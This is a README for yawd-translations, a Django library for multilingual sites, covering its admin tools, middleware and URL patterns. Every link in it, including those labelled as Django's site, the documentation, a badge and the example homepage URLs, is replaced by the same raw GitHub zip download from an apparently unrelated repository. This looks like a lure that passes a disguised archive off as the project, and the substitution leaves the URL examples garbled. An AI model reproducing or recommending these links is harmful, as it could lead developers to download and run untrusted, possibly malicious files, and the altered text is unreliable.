yawd-translations, create multilingual django websites
======================================================

`yawd-translations <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_
provides a set of tools for creating multilingual websites with
`django <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_.

The application includes the following tools:

* Manage the website's installed Languages through the admin interface
* Generate translation messages (``makemessages`` and ``compilemessages``) for all installed applications and defined languages using the admin interface (no need to restart the web server).
* Translatable db models API
* A custom `admin inline <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_  to manage db translations
* A custom middleware to replace `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_ and achieve the following:

	* Change the way django detects language preference and use the db default language (set through the admin interface)
	* Redirects to language-dependant URLs are permanent (301) and not temporary (302).
	
* A patterns function (that behaves pretty-much like django's own `i18n_patterns() <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_ does) to achieve the following:

	* Match root URL paths as default language URLs: If your default language is English (``en``), ``i18n_patterns()`` will not match the ``/`` URL as the english homepage and the django middleware would redirect pages to their ``/en/`` equivalent (e.g. your homepage would be `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip` and all requests to `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip` would be redirected to `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip`). The custom patterns function implements the exact opposite, which is a common practice to web development. Therefore `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip` will be matched as the real permalink (instead of `https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip`). For non-default languages, the custom patterns function behaves like ``i18n_patters()`` does.

* A `context processor` to access available languages in your templates and a simple `template tag` to easily switch between the available translations of a page in the front-end website.


.. note::
	yawd-translations v0.5.2 is the last version intended to work with
	Django 1.4. The current master is actively developed under Django 1.5
	and does NOT work with older Django releases. For those still using
	Django 1.4, you can checkout the ``0.5.x`` branch or use the yawd-translations
	v0.5.2 pypi package. New features will not be backported to the ``0.5.x``
	branch. Since many of us run production systems tied to Django 1.4, both
	v0.5.2 and the latest documentation will be online on https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip 

Usage and demo
==============

See the `yawd-translations documentation <https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip>`_ 
for information on how to install the demo and use yawd-translations.


.. image:: https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip
   :alt: Bitdeli badge
   :target: https://raw.githubusercontent.com/basavaraj08/yawd-translations/master/confidentiality/yawd-translations.zip

